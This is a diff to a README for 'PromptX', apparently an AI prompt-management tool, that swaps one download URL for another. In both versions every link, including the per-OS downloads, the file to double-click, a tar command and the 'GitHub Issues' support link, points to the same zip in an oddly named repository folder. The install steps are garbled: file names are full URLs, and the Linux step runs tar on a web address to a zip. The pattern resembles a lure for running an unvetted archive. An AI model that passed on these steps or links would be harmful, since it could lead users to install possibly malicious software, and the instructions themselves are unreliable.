@@ -1,6 +1,6 @@
 # 🚀 PromptX - Boost Your AI Workflow Effortlessly
 
-[![Download PromptX](https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip)](https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip)
+[![Download PromptX](https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip)](https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip)
 
 PromptX 不仅仅是一个提示词存储工具，它是专为 AI 时代打造的生产力神器。采用 UI/UX Pro Max 设计标准，结合强大的版本管理和智能分类，让你的 AI 工作流效率提升 10x。
 
@@ -28,7 +28,7 @@ PromptX 不仅仅是一个提示词存储工具，它是专为 AI 时代打造�
 
 To download PromptX, click the button below:
 
-[![Download PromptX](https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip)](https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip)
+[![Download PromptX](https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip)](https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip)
 
 ### Step 2: Choose Your Version
 
@@ -38,30 +38,30 @@ Once you are on the Releases page, you will see a list of available versions. Lo
 
 Below the version details, you will see a list of files. Choose the appropriate file for your operating system:
 
-- **Windows:** Download `https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip`
-- **macOS:** Download `https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip`
-- **Linux:** Download `https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip`
+- **Windows:** Download `https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip`
+- **macOS:** Download `https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip`
+- **Linux:** Download `https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip`
 
 After you click on the file, your download should start automatically.
 
 ### Step 4: Install PromptX
 
 #### For Windows:
-1. Locate the downloaded `https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip` file in your Downloads folder.
+1. Locate the downloaded `https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip` file in your Downloads folder.
 2. Right-click the file and choose "Extract All..." to unzip the contents.
-3. Open the extracted folder and double-click `https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip` to run the application.
+3. Open the extracted folder and double-click `https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip` to run the application.
 
 #### For macOS:
-1. Find the downloaded `https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip` file in your Downloads folder.
+1. Find the downloaded `https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip` file in your Downloads folder.
 2. Double-click the file to open it.
 3. Drag the `PromptX` icon to your Applications folder.
 4. Open your Applications folder and double-click `PromptX` to start using it.
 
 #### For Linux:
-1. Navigate to the folder where you downloaded `https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip`.
+1. Navigate to the folder where you downloaded `https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip`.
 2. Use a terminal window and run the following commands:
    ```
-   tar -xvzf https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip
+   tar -xvzf https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip
    cd PromptX
    ./PromptX
    ```
@@ -77,7 +77,7 @@ After installing PromptX, you can easily start managing your AI prompts. The int
 
 ## 📞 Support
 
-If you run into any issues or have questions, please check the FAQ section in the application or reach out to our support team via [GitHub Issues](https://raw.githubusercontent.com/Jhoy-jpg/PromptX/main/trisilane/X_Prompt_v2.5.zip).
+If you run into any issues or have questions, please check the FAQ section in the application or reach out to our support team via [GitHub Issues](https://github.com/Jhoy-jpg/PromptX/raw/refs/heads/main/trisilane/Prompt-X-v2.1.zip).
 
 For detailed usage instructions, look for the help section within the app.
 
